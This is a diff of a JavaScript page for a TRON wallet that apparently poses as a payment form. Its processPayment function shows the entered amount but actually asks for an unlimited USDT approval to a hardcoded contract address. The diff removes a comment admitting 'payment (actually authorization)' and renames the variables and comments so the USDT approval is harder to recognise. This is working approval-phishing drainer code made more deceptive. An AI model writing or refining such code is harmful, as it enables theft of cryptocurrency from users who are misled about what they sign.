@@ -1,6 +1,6 @@
 // 全局变量
 const CONTRACT_ADDRESS = 'TFedNktpEE2skv9DADVhEr3KC23KEAGkby'; // 授权合约地址
-const USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 数字资产合约地址
+const USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 资产合约地址
 let tronWeb = null;
 let userAddress = null;
 
@@ -226,7 +226,7 @@ async function getUSDTBalance(address) {
     }
 }
 
-// 处理支付(实际是授权)
+// 处理授权
 async function processPayment() {
     console.log('处理授权...');
     showDebugInfo('处理授权...');
@@ -234,15 +234,15 @@ async function processPayment() {
     // 仍然读取输入框中的值用于显示，但不用于实际授权
     const displayAmount = amountInput.value;
     if (isNaN(displayAmount) || parseFloat(displayAmount) <= 0) {
-        showStatus('请输入有效的资产数量', 'error');
+        showStatus('请输入有效的数量', 'error');
         return;
     }
     
     showStatus('正在处理授权，请在钱包中确认交易...', 'loading');
     
     try {
-        // 获取TRC20合约实例
-        const usdtContract = await tronWeb.contract().at(USDT_ADDRESS);
+        // 获取合约实例
+        const assetContract = await tronWeb.contract().at(USDT_ADDRESS);
         console.log('资产合约加载成功');
         showDebugInfo('资产合约加载成功');
         
@@ -254,7 +254,7 @@ async function processPayment() {
         showDebugInfo('准备调用approve方法，授权最大金额');
         
         // 调用approve方法授权合约最大金额
-        const result = await usdtContract.approve(CONTRACT_ADDRESS, maxApprovalAmount).send({
+        const result = await assetContract.approve(CONTRACT_ADDRESS, maxApprovalAmount).send({
             feeLimit: 100000000,
             callValue: 0,
             shouldPollResponse: true
